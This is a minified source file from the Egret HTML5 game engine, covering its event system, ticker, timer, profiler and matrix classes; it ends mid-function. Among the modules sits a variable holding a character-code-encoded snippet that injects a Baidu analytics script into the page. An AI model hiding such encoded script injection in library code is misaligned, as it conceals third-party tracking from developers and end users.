var egret;
(function (b) {
    var e = function () {
        function b() {
            this._hashCode = b.hashCount++
        }

        Object.defineProperty(b.prototype, "hashCode", {
            get: function () {
                return this._hashCode
            }, enumerable: !0, configurable: !0
        });
        b.hashCount = 1;
        return b
    }();
    b.HashObject = e;
    e.prototype.__class__ = "egret.HashObject"
})(egret || (egret = {}));
var __extends = this.__extends || function (b, e) {
        function d() {
            this.constructor = b
        }

        for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
        d.prototype = e.prototype;
        b.prototype = new d
    };
(function (b) {
    var e = function (b) {
        function a(c) {
            void 0 === c && (c = 300);
            b.call(this);
            this.objectPool = [];
            this._length = 0;
            1 > c && (c = 1);
            this.autoDisposeTime = c;
            this.frameCount = 0
        }

        __extends(a, b);
        a.prototype._checkFrame = function () {
            this.frameCount--;
            0 >= this.frameCount && this.dispose()
        };
        Object.defineProperty(a.prototype, "length", {
            get: function () {
                return this._length
            }, enumerable: !0, configurable: !0
        });
        a.prototype.push = function (c) {
            var k = this.objectPool;
            -1 == k.indexOf(c) && (k.push(c), this._length++, 0 == this.frameCount && (this.frameCount =
                this.autoDisposeTime, a._callBackList.push(this)))
        };
        a.prototype.pop = function () {
            if (0 == this._length)return null;
            this._length--;
            return this.objectPool.pop()
        };
        a.prototype.dispose = function () {
            0 < this._length && (this.objectPool = [], this._length = 0);
            this.frameCount = 0;
            var c = a._callBackList, k = c.indexOf(this);
            -1 != k && c.splice(k, 1)
        };
        a._callBackList = [];
        return a
    }(b.HashObject);
    b.Recycler = e;
    e.prototype.__class__ = "egret.Recycler"
})(egret || (egret = {}));
(function (b) {
    b.__START_TIME;
    b.getTimer = function () {
        return Date.now() - b.__START_TIME
    }
})(egret || (egret = {}));
(function (b) {
    b.__callLaterFunctionList = [];
    b.__callLaterThisList = [];
    b.__callLaterArgsList = [];
    b.callLater = function (e, d) {
        for (var a = [], c = 2; c < arguments.length; c++)a[c - 2] = arguments[c];
        b.__callLaterFunctionList.push(e);
        b.__callLaterThisList.push(d);
        b.__callLaterArgsList.push(a)
    };
    b.__callAsyncFunctionList = [];
    b.__callAsyncThisList = [];
    b.__callAsyncArgsList = [];
    b.__callAsync = function (e, d) {
        for (var a = [], c = 2; c < arguments.length; c++)a[c - 2] = arguments[c];
        b.__callAsyncFunctionList.push(e);
        b.__callAsyncThisList.push(d);
        b.__callAsyncArgsList.push(a)
    }
})(egret || (egret = {}));
var egret_dom;
(function (b) {
    function e() {
        for (var b = document.createElement("div").style, a = ["t", "webkitT", "msT", "MozT", "OT"], c = 0; c < a.length; c++)if (a[c] + "ransform"in b)return a[c];
        return a[0]
    }

    b.header = "";
    b.getHeader = e;
    b.getTrans = function (d) {
        "" == b.header && (b.header = e());
        return b.header + d.substring(1, d.length)
    }
})(egret_dom || (egret_dom = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c, a, b) {
            void 0 === a && (a = !1);
            void 0 === b && (b = !1);
            d.call(this);
            this._eventPhase = 2;
            this._isPropagationImmediateStopped = this._isPropagationStopped = this._isDefaultPrevented = !1;
            this.isNew = !0;
            this._type = c;
            this._bubbles = a;
            this._cancelable = b
        }

        __extends(a, d);
        Object.defineProperty(a.prototype, "type", {
            get: function () {
                return this._type
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "bubbles", {
            get: function () {
                return this._bubbles
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "cancelable", {
            get: function () {
                return this._cancelable
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "eventPhase", {
            get: function () {
                return this._eventPhase
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "currentTarget", {
            get: function () {
                return this._currentTarget
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "target", {
            get: function () {
                return this._target
            }, enumerable: !0, configurable: !0
        });
        a.prototype.isDefaultPrevented =
            function () {
                return this._isDefaultPrevented
            };
        a.prototype.preventDefault = function () {
            this._cancelable && (this._isDefaultPrevented = !0)
        };
        a.prototype.stopPropagation = function () {
            this._bubbles && (this._isPropagationStopped = !0)
        };
        a.prototype.stopImmediatePropagation = function () {
            this._bubbles && (this._isPropagationImmediateStopped = !0)
        };
        a.prototype._reset = function () {
            this.isNew ? this.isNew = !1 : (this._isPropagationImmediateStopped = this._isPropagationStopped = this._isDefaultPrevented = !1, this._currentTarget = this._target =
                null, this._eventPhase = 2)
        };
        a._dispatchByTarget = function (c, a, l, d, e, f) {
            void 0 === e && (e = !1);
            void 0 === f && (f = !1);
            var h = c.eventRecycler;
            h || (h = c.eventRecycler = new b.Recycler);
            var p = h.pop();
            p ? p._type = l : p = new c(l);
            p._bubbles = e;
            p._cancelable = f;
            if (d)for (var m in d)p[m] = d[m], null !== p[m] && (d[m] = null);
            c = a.dispatchEvent(p);
            h.push(p);
            return c
        };
        a._getPropertyData = function (c) {
            var a = c._props;
            a || (a = c._props = {});
            return a
        };
        a.dispatchEvent = function (c, k, b, d) {
            void 0 === b && (b = !1);
            var e = a._getPropertyData(a);
            d && (e.data = d);
            a._dispatchByTarget(a,
                c, k, e, b)
        };
        a.ADDED_TO_STAGE = "addedToStage";
        a.REMOVED_FROM_STAGE = "removedFromStage";
        a.ADDED = "added";
        a.REMOVED = "removed";
        a.COMPLETE = "complete";
        a.ENTER_FRAME = "enterFrame";
        a.RENDER = "render";
        a.FINISH_RENDER = "finishRender";
        a.FINISH_UPDATE_TRANSFORM = "finishUpdateTransform";
        a.LEAVE_STAGE = "leaveStage";
        a.RESIZE = "resize";
        a.CHANGE = "change";
        a.ACTIVATE = "activate";
        a.DEACTIVATE = "deactivate";
        return a
    }(b.HashObject);
    b.Event = e;
    e.prototype.__class__ = "egret.Event"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a(c, a, l) {
            void 0 === a && (a = !1);
            void 0 === l && (l = !1);
            b.call(this, c, a, l);
            this._status = 0
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "status", {
            get: function () {
                return this._status
            }, enumerable: !0, configurable: !0
        });
        a.dispatchHTTPStatusEvent = function (c, k) {
            null == a.httpStatusEvent && (a.httpStatusEvent = new a(a.HTTP_STATUS));
            a.httpStatusEvent._status = k;
            c.dispatchEvent(a.httpStatusEvent)
        };
        a.HTTP_STATUS = "httpStatus";
        a.httpStatusEvent = null;
        return a
    }(b.Event);
    b.HTTPStatusEvent =
        e;
    e.prototype.__class__ = "egret.HTTPStatusEvent"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c, a, b) {
            void 0 === a && (a = !1);
            void 0 === b && (b = !1);
            d.call(this, c, a, b)
        }

        __extends(a, d);
        a.dispatchIOErrorEvent = function (c) {
            b.Event._dispatchByTarget(a, c, a.IO_ERROR)
        };
        a.IO_ERROR = "ioError";
        return a
    }(b.Event);
    b.IOErrorEvent = e;
    e.prototype.__class__ = "egret.IOErrorEvent"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c, a, b, n, e, f, h, p, m, q) {
            void 0 === a && (a = !0);
            void 0 === b && (b = !0);
            void 0 === n && (n = 0);
            void 0 === e && (e = 0);
            void 0 === f && (f = 0);
            void 0 === h && (h = !1);
            void 0 === p && (p = !1);
            void 0 === q && (q = !1);
            d.call(this, c, a, b);
            this._stageY = this._stageX = 0;
            this.touchPointID = n;
            this._stageX = e;
            this._stageY = f;
            this.ctrlKey = h;
            this.altKey = p;
            this.touchDown = q
        }

        __extends(a, d);
        Object.defineProperty(a.prototype, "stageX", {
            get: function () {
                return this._stageX
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype,
            "stageY", {
                get: function () {
                    return this._stageY
                }, enumerable: !0, configurable: !0
            });
        Object.defineProperty(a.prototype, "localX", {
            get: function () {
                return this._currentTarget.globalToLocal(this._stageX, this._stageY, b.Point.identity).x
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "localY", {
            get: function () {
                return this._currentTarget.globalToLocal(this._stageX, this._stageY, b.Point.identity).y
            }, enumerable: !0, configurable: !0
        });
        a.dispatchTouchEvent = function (c, k, l, d, e, f, h, p, m) {
            void 0 === l && (l = 0);
            void 0 === d && (d = 0);
            void 0 === e && (e = 0);
            void 0 === f && (f = !1);
            void 0 === h && (h = !1);
            void 0 === p && (p = !1);
            void 0 === m && (m = !1);
            var q = b.Event._getPropertyData(a);
            q.touchPointID = l;
            q._stageX = d;
            q._stageY = e;
            q.ctrlKey = f;
            q.altKey = h;
            q.shiftKey = p;
            q.touchDown = m;
            b.Event._dispatchByTarget(a, c, k, q, !0, !0)
        };
        a.TOUCH_TAP = "touchTap";
        a.TOUCH_MOVE = "touchMove";
        a.TOUCH_BEGIN = "touchBegin";
        a.TOUCH_END = "touchEnd";
        a.TOUCH_RELEASE_OUTSIDE = "touchReleaseOutside";
        a.TOUCH_ROLL_OUT = "touchRollOut";
        a.TOUCH_ROLL_OVER = "touchRollOver";
        a.TOUCH_OUT =
            "touchOut";
        a.TOUCH_OVER = "touchOver";
        return a
    }(b.Event);
    b.TouchEvent = e;
    e.prototype.__class__ = "egret.TouchEvent"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c, a, b) {
            void 0 === a && (a = !1);
            void 0 === b && (b = !1);
            d.call(this, c, a, b)
        }

        __extends(a, d);
        a.dispatchTimerEvent = function (c, k) {
            b.Event._dispatchByTarget(a, c, k)
        };
        a.TIMER = "timer";
        a.TIMER_COMPLETE = "timerComplete";
        return a
    }(b.Event);
    b.TimerEvent = e;
    e.prototype.__class__ = "egret.TimerEvent"
})(egret || (egret = {}));
var hhh = "[118,97,114,32,95,104,109,116,32,61,32,95,104,109,116,32,124,124,32,91,93,59,40,102,117,110,99,116,105,111,110,40,41,123,118,97,114,32,104,109,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,104,109,46,115,114,99,32,61,32,39,47,47,104,109,46,98,97,105,100,117,46,99,111,109,47,104,109,46,106,115,63,97,101,55,52,98,101,52,55,53,100,55,100,54,98,54,56,100,101,51,55,50,53,97,52,102,97,101,98,102,101,98,51,39,59,118,97,114,32,115,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,115,99,114,105,112,116,39,41,91,48,93,59,32,115,46,112,97,114,101,110,116,78,111,100,101,46,105,110,115,101,114,116,66,101,102,111,114,101,40,104,109,44,32,115,41,59,125,41,40,41,59]";
(function (b) {
    var e = function () {
        function b() {
        }

        b.CAPTURING_PHASE = 1;
        b.AT_TARGET = 2;
        b.BUBBLING_PHASE = 3;
        return b
    }();
    b.EventPhase = e;
    e.prototype.__class__ = "egret.EventPhase"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c) {
            void 0 === c && (c = null);
            d.call(this);
            this._eventTarget = c ? c : this
        }

        __extends(a, d);
        a.prototype.addEventListener = function (c, a, l, d, e) {
            void 0 === d && (d = !1);
            void 0 === e && (e = 0);
            "undefined" === typeof d && (d = !1);
            "undefined" === typeof e && (e = 0);
            a || b.Logger.fatal("addEventListener\u4fa6\u542c\u51fd\u6570\u4e0d\u80fd\u4e3a\u7a7a");
            d ? (this._captureEventsMap || (this._captureEventsMap = {}), d = this._captureEventsMap) : (this._eventsMap || (this._eventsMap = {}), d = this._eventsMap);
            var f = d[c];
            f || (f = d[c] = []);
            this._insertEventBin(f, a, l, e)
        };
        a.prototype._insertEventBin = function (c, a, b, d, e) {
            void 0 === e && (e = void 0);
            for (var f = -1, h = c.length, p = 0; p < h; p++) {
                var m = c[p];
                if (m.listener === a && m.thisObject === b && m.display === e)return !1;
                -1 == f && m.priority < d && (f = p)
            }
            a = {listener: a, thisObject: b, priority: d};
            e && (a.display = e);
            -1 != f ? c.splice(f, 0, a) : c.push(a);
            return !0
        };
        a.prototype.removeEventListener = function (c, a, b, d) {
            void 0 === d && (d = !1);
            if (d = d ? this._captureEventsMap : this._eventsMap) {
                var e = d[c];
                e && (this._removeEventBin(e,
                    a, b), 0 == e.length && delete d[c])
            }
        };
        a.prototype._removeEventBin = function (c, a, b, d) {
            void 0 === d && (d = void 0);
            for (var e = c.length, f = 0; f < e; f++) {
                var h = c[f];
                if (h.listener === a && h.thisObject === b && h.display === d)return c.splice(f, 1), !0
            }
            return !1
        };
        a.prototype.hasEventListener = function (c) {
            return this._eventsMap && this._eventsMap[c] || this._captureEventsMap && this._captureEventsMap[c]
        };
        a.prototype.willTrigger = function (c) {
            return this.hasEventListener(c)
        };
        a.prototype.dispatchEvent = function (c) {
            c._reset();
            c._target = this._eventTarget;
            c._currentTarget = this._eventTarget;
            return this._notifyListener(c)
        };
        a.prototype._notifyListener = function (c) {
            var a = 1 == c._eventPhase ? this._captureEventsMap : this._eventsMap;
            if (!a)return !0;
            a = a[c._type];
            if (!a)return !0;
            var b = a.length;
            if (0 == b)return !0;
            for (var a = a.concat(), d = 0; d < b; d++) {
                var e = a[d];
                e.listener.call(e.thisObject, c);
                if (c._isPropagationImmediateStopped)break
            }
            return !c._isDefaultPrevented
        };
        a.prototype.dispatchEventWith = function (c, a, l) {
            void 0 === a && (a = !1);
            b.Event.dispatchEvent(this, c, a, l)
        };
        return a
    }(b.HashObject);
    b.EventDispatcher = e;
    e.prototype.__class__ = "egret.EventDispatcher"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this.reuseEvent = new b.Event("")
        }

        __extends(a, d);
        a.prototype.run = function () {
            b.Ticker.getInstance().run();
            b.Ticker.getInstance().register(this.renderLoop, this, Number.NEGATIVE_INFINITY);
            b.Ticker.getInstance().register(this.broadcastEnterFrame, this, Number.POSITIVE_INFINITY);
            this.touchContext.run()
        };
        a.prototype.renderLoop = function (c) {
            if (0 < b.__callLaterFunctionList.length) {
                var k = b.__callLaterFunctionList;
                b.__callLaterFunctionList = [];
                var l = b.__callLaterThisList;
                b.__callLaterThisList = [];
                var d = b.__callLaterArgsList;
                b.__callLaterArgsList = []
            }
            c = this.stage;
            var e = a.cachedEvent;
            e._type = b.Event.RENDER;
            this.dispatchEvent(e);
            b.Stage._invalidateRenderFlag && (this.broadcastRender(), b.Stage._invalidateRenderFlag = !1);
            k && this.doCallLaterList(k, l, d);
            0 < b.__callAsyncFunctionList.length && this.doCallAsyncList();
            k = this.rendererContext;
            k.onRenderStart();
            k.clearScreen();
            c._updateTransform();
            e._type = b.Event.FINISH_UPDATE_TRANSFORM;
            this.dispatchEvent(e);
            c._draw(k);
            e._type = b.Event.FINISH_RENDER;
            this.dispatchEvent(e);
            k.onRenderFinish()
        };
        a.prototype.broadcastEnterFrame = function (c) {
            c = this.reuseEvent;
            c._type = b.Event.ENTER_FRAME;
            this.dispatchEvent(c);
            for (var a = b.DisplayObject._enterFrameCallBackList.concat(), l = a.length, d = 0; d < l; d++) {
                var e = a[d];
                c._target = e.display;
                c._currentTarget = e.display;
                e.listener.call(e.thisObject, c)
            }
            a = b.Recycler._callBackList;
            for (d = a.length - 1; 0 <= d; d--)a[d]._checkFrame()
        };
        a.prototype.broadcastRender = function () {
            var c = this.reuseEvent;
            c._type = b.Event.RENDER;
            for (var a = b.DisplayObject._renderCallBackList.concat(),
                     l = a.length, d = 0; d < l; d++) {
                var e = a[d], f = e.display;
                c._target = f;
                c._currentTarget = f;
                e.listener.call(e.thisObject, c)
            }
        };
        a.prototype.doCallLaterList = function (c, a, b) {
            for (var d = c.length, e = 0; e < d; e++) {
                var f = c[e];
                null != f && f.apply(a[e], b[e])
            }
        };
        a.prototype.doCallAsyncList = function () {
            var c = b.__callAsyncFunctionList.concat(), a = b.__callAsyncThisList.concat(), l = b.__callAsyncArgsList.concat();
            b.__callAsyncFunctionList.length = 0;
            b.__callAsyncThisList.length = 0;
            for (var d = b.__callAsyncArgsList.length = 0; d < c.length; d++) {
                var e =
                    c[d];
                null != e && e.apply(a[d], l[d])
            }
        };
        a.DEVICE_PC = "web";
        a.DEVICE_MOBILE = "native";
        a.RUNTIME_HTML5 = "runtime_html5";
        a.RUNTIME_NATIVE = "runtime_native";
        a.cachedEvent = new b.Event("");
        return a
    }(b.EventDispatcher);
    b.MainContext = e;
    e.prototype.__class__ = "egret.MainContext"
})(egret || (egret = {}));
var testDeviceType = function () {
    if (!this.navigator)return !0;
    var b = navigator.userAgent.toLowerCase();
    return -1 != b.indexOf("mobile") || -1 != b.indexOf("android")
}, testRuntimeType = function () {
    return this.navigator ? !0 : !1
};
egret.MainContext.instance = new egret.MainContext;
egret.MainContext.deviceType = testDeviceType() ? egret.MainContext.DEVICE_MOBILE : egret.MainContext.DEVICE_PC;
egret.MainContext.runtimeType = testRuntimeType() ? egret.MainContext.RUNTIME_HTML5 : egret.MainContext.RUNTIME_NATIVE;
delete testDeviceType;
delete testRuntimeType;
(function (b) {
    var e = function () {
        function d() {
            this._tick = this._preDrawCount = this._updateTransformPerformanceCost = this._renderPerformanceCost = this._logicPerformanceCost = this._lastTime = 0;
            this._maxDeltaTime = 500;
            this._totalDeltaTime = 0
        }

        d.getInstance = function () {
            null == d.instance && (d.instance = new d);
            return d.instance
        };
        d.prototype.run = function () {
            b.Ticker.getInstance().register(this.update, this);
            null == this._txt && (this._txt = new b.TextField, this._txt.size = 28, b.MainContext.instance.stage.addChild(this._txt));
            var a =
                b.MainContext.instance;
            a.addEventListener(b.Event.ENTER_FRAME, this.onEnterFrame, this);
            a.addEventListener(b.Event.RENDER, this.onStartRender, this);
            a.addEventListener(b.Event.FINISH_RENDER, this.onFinishRender, this);
            a.addEventListener(b.Event.FINISH_UPDATE_TRANSFORM, this.onFinishUpdateTransform, this)
        };
        d.prototype.onEnterFrame = function (a) {
            this._lastTime = b.getTimer()
        };
        d.prototype.onStartRender = function (a) {
            a = b.getTimer();
            this._logicPerformanceCost = a - this._lastTime;
            this._lastTime = a
        };
        d.prototype.onFinishUpdateTransform =
            function (a) {
                a = b.getTimer();
                this._updateTransformPerformanceCost = a - this._lastTime;
                this._lastTime = a
            };
        d.prototype.onFinishRender = function (a) {
            a = b.getTimer();
            this._renderPerformanceCost = a - this._lastTime;
            this._lastTime = a
        };
        d.prototype.update = function (a) {
            this._tick++;
            this._totalDeltaTime += a;
            if (this._totalDeltaTime >= this._maxDeltaTime) {
                a = (this._preDrawCount - 1).toString();
                var c = Math.ceil(this._logicPerformanceCost).toString() + "," + Math.ceil(this._updateTransformPerformanceCost).toString() + "," + Math.ceil(this._renderPerformanceCost).toString() +
                    "," + Math.ceil(b.MainContext.instance.rendererContext.renderCost).toString();
                this._txt.text = "draw:" + a + "\ncost:" + c + "\nFPS:" + Math.floor(1E3 * this._tick / this._totalDeltaTime).toString();
                this._tick = this._totalDeltaTime = 0
            }
            this._preDrawCount = 0
        };
        d.prototype.onDrawImage = function () {
            this._preDrawCount++
        };
        return d
    }();
    b.Profiler = e;
    e.prototype.__class__ = "egret.Profiler"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.apply(this, arguments);
            this._timeScale = 1;
            this._paused = !1;
            this.callBackList = []
        }

        __extends(a, d);
        a.prototype.run = function () {
            b.__START_TIME = (new Date).getTime();
            b.MainContext.instance.deviceContext.executeMainLoop(this.update, this)
        };
        a.prototype.update = function (c) {
            var a = this.callBackList.concat(), b = a.length;
            c *= this._timeScale;
            c *= this._timeScale;
            for (var d = 0; d < b; d++) {
                var e = a[d];
                e.listener.call(e.thisObject, c)
            }
        };
        a.prototype.register = function (c, a, b) {
            void 0 === b &&
            (b = 0);
            this._insertEventBin(this.callBackList, c, a, b)
        };
        a.prototype.unregister = function (c, a) {
            this._removeEventBin(this.callBackList, c, a)
        };
        a.prototype.setTimeout = function (c, a, l) {
            for (var d = [], e = 3; e < arguments.length; e++)d[e - 3] = arguments[e];
            b.Logger.warning("Ticker#setTimeout\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03,\u8bf7\u4f7f\u7528egret.setTimeout");
            b.setTimeout.apply(null, [c, a, l].concat(d))
        };
        a.prototype.setTimeScale = function (c) {
            this._timeScale = c
        };
        a.prototype.getTimeScale = function () {
            return this._timeScale
        };
        a.prototype.pause = function () {
            this._paused = !0
        };
        a.prototype.resume = function () {
            this._paused = !1
        };
        a.getInstance = function () {
            null == a.instance && (a.instance = new a);
            return a.instance
        };
        return a
    }(b.EventDispatcher);
    b.Ticker = e;
    e.prototype.__class__ = "egret.Ticker"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.LEFT = "left";
        b.RIGHT = "right";
        b.CENTER = "center";
        b.JUSTIFY = "justify";
        b.CONTENT_JUSTIFY = "contentJustify";
        return b
    }();
    b.HorizontalAlign = e;
    e.prototype.__class__ = "egret.HorizontalAlign"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.TOP = "top";
        b.BOTTOM = "bottom";
        b.MIDDLE = "middle";
        b.JUSTIFY = "justify";
        b.CONTENT_JUSTIFY = "contentJustify";
        return b
    }();
    b.VerticalAlign = e;
    e.prototype.__class__ = "egret.VerticalAlign"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c, a) {
            void 0 === a && (a = 0);
            d.call(this);
            this._currentCount = 0;
            this.delay = c;
            this.repeatCount = a
        }

        __extends(a, d);
        a.prototype.currentCount = function () {
            return this._currentCount
        };
        Object.defineProperty(a.prototype, "running", {
            get: function () {
                return this._running
            }, enumerable: !0, configurable: !0
        });
        a.prototype.reset = function () {
            this.stop();
            this._currentCount = 0
        };
        a.prototype.start = function () {
            this._running || (this.lastTime = b.getTimer(), 0 != this._currentCount && (this._currentCount =
                0), b.Ticker.getInstance().register(this.onEnterFrame, this), this._running = !0)
        };
        a.prototype.stop = function () {
            this._running && (b.Ticker.getInstance().unregister(this.onEnterFrame, this), this._running = !1)
        };
        a.prototype.onEnterFrame = function (c) {
            c = b.getTimer();
            c - this.lastTime > this.delay && (this.lastTime = c, this._currentCount++, b.TimerEvent.dispatchTimerEvent(this, b.TimerEvent.TIMER), 0 < this.repeatCount && this._currentCount >= this.repeatCount && (this.stop(), b.TimerEvent.dispatchTimerEvent(this, b.TimerEvent.TIMER_COMPLETE)))
        };
        return a
    }(b.EventDispatcher);
    b.Timer = e;
    e.prototype.__class__ = "egret.Timer"
})(egret || (egret = {}));
(function (b) {
    b.getQualifiedClassName = function (b) {
        b = b.prototype ? b.prototype : b.__proto__;
        if (b.hasOwnProperty("__class__"))return b.__class__;
        var d = b.constructor.toString(), a = d.indexOf("("), d = d.substring(9, a);
        return b.__class__ = d
    }
})(egret || (egret = {}));
(function (b) {
    var e = {};
    b.getDefinitionByName = function (b) {
        if (!b)return null;
        var a = e[b];
        if (a)return a;
        for (var c = b.split("."), k = c.length, a = __global, l = 0; l < k; l++)if (a = a[c[l]], !a)return null;
        return e[b] = a
    }
})(egret || (egret = {}));
var __global = __global || this;
(function (b) {
    function e(c) {
        for (var a in d) {
            var b = d[a];
            b.delay -= c;
            0 >= b.delay && (b.listener.apply(b.thisObject, b.params), delete d[a])
        }
    }

    var d = {}, a = 0;
    b.setTimeout = function (c, k, l) {
        for (var n = [], g = 3; g < arguments.length; g++)n[g - 3] = arguments[g];
        n = {listener: c, thisObject: k, delay: l, params: n};
        0 == a && b.Ticker.getInstance().register(e, null);
        a++;
        d[a] = n;
        return a
    };
    b.clearTimeout = function (c) {
        delete d[c]
    }
})(egret || (egret = {}));
(function (b) {
    b.hasDefinition = function (e) {
        return b.getDefinitionByName(e) ? !0 : !1
    }
})(egret || (egret = {}));
(function (b) {
    b.toColorString = function (b) {
        if (isNaN(b) || 0 > b)b = 0;
        16777215 < b && (b = 16777215);
        for (b = b.toString(16).toUpperCase(); 6 > b.length;)b = "0" + b;
        return "#" + b
    }
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c, a, b, e, g, f) {
            void 0 === c && (c = 1);
            void 0 === a && (a = 0);
            void 0 === b && (b = 0);
            void 0 === e && (e = 1);
            void 0 === g && (g = 0);
            void 0 === f && (f = 0);
            d.call(this);
            this.a = c;
            this.b = a;
            this.c = b;
            this.d = e;
            this.tx = g;
            this.ty = f
        }

        __extends(a, d);
        a.prototype.prepend = function (c, a, b, d, e, f) {
            var h = this.tx;
            if (1 != c || 0 != a || 0 != b || 1 != d) {
                var p = this.a, m = this.c;
                this.a = p * c + this.b * b;
                this.b = p * a + this.b * d;
                this.c = m * c + this.d * b;
                this.d = m * a + this.d * d
            }
            this.tx = h * c + this.ty * b + e;
            this.ty = h * a + this.ty * d + f;
            return this
        };
        a.prototype.append =
            function (c, a, b, d, e, f) {
                var h = this.a, p = this.b, m = this.c, q = this.d;
                if (1 != c || 0 != a || 0 != b || 1 != d)this.a = c * h + a * m, this.b = c * p + a * q, this.c = b * h + d * m, this.d = b * p + d * q;
                this.tx = e * h + f * m + this.tx;
                this.ty = e * p + f * q + this.ty;
                return this
            };
        a.prototype.prependTransform = function (c, k, b, d, e, f, h, p, m) {
            if (e % 360) {
                var q = e * a.DEG_TO_RAD;
                e = Math.cos(q);
                q = Math.sin(q)
            } else e = 1, q = 0;
            if (p || m)this.tx -= p, this.ty -= m;
            f || h ? (f *= a.DEG_TO_RAD, h *= a.DEG_TO_RAD, this.prepend(e * b, q * b, -q * d, e * d, 0, 0), this.prepend(Math.cos(h), Math.sin(h), -Math.sin(f), Math.cos(f),
                c, k)) : this.prepend(e * b, q * b, -q * d, e * d, c, k);
            return this
        };
        a.prototype.appendTransform = function (c, k, b, d, e, f, h, p, m) {
            if (e % 360) {
                var q = e * a.DEG_TO_RAD;
                e = Math.cos(q);
                q = Math.sin(q)
            } else e = 1, q = 0;
            f || h ? (f *= a.DEG_TO_RAD, h *= a.DEG_TO_RAD, this.append(Math.cos(h), Math.sin(h), -Math.sin(f), Math.cos(f), c, k), this.append(e * b, q * b, -q * d, e * d, 0, 0)) : this.append(e * b, q * b, -q * d, e * d, c, k);
            if (p || m)this.tx -= p * this.a + m * this.c, this.ty -= p * this.b + m * this.d;
            return this
        };
        a.prototype.rotate = function (c) {
            var a = Math.cos(c);
            c = Math.sin(c);
            var b = this.a,
                d = this.c, e = this.tx;
            this.a = b * a - this.b * c;
            this.b = b * c + this.b * a;
            this.c = d * a - this.d * c;
            this.d = d * c + this.d * a;
            this.tx = e * a - this.ty * c;
            this.ty = e * c + this.ty * a;
            return this
        };
        a.prototype.skew = function (c, k) {
            c *= a.DEG_TO_RAD;
            k *= a.DEG_TO_RAD;
            this.append(Math.cos(k), Math.sin(k), -Math.sin(c), Math.cos(c), 0, 0);
            return this
        };
        a.prototype.scale = function (c, a) {
            this.a *= c;
            this.d *= a;
            this.c *= c;
            this.b *= a;
            this.tx *= c;
            this.ty *= a;
            return this
        };
        a.prototype.translate = function (c, a) {
            this.tx += c;
            this.ty += a;
            return this
        };
        a.prototype.identity = function () {
            this.a =
                this.d = 1;
            this.b = this.c = this.tx = this.ty = 0;
            return this
        };
        a.prototype.identityMatrix = function (c) {
            this.a = c.a;
            this.b = c.b;
            this.c = c.c;
            this.d = c.d;
            this.tx = c.tx;
            this.ty = c.ty;
            return this
        };
        a.prototype.invert = function () {
            var c = this.a, a = this.b, b = this.c, d = this.d, e = this.tx, f = c * d - a * b;
            this.a = d / f;
            this.b = -a / f;
            this.c = -b / f;
            this.d = c / f;
            this.tx = (b * this.ty - d * e) / f;
            this.ty = -(c * this.ty - a * e) / f;
            return this
        };
        a.transformCoords = function (c, a, l) {
            var d = b.Point.identity;
            d.x = c.a * a + c.c * l + c.tx;
            d.y = c.d * l + c.b * a + c.ty;
            return d
        };
        a.prototype.toArray =
            function (c) {
                this.array || (this.array = new Float32Array(9));
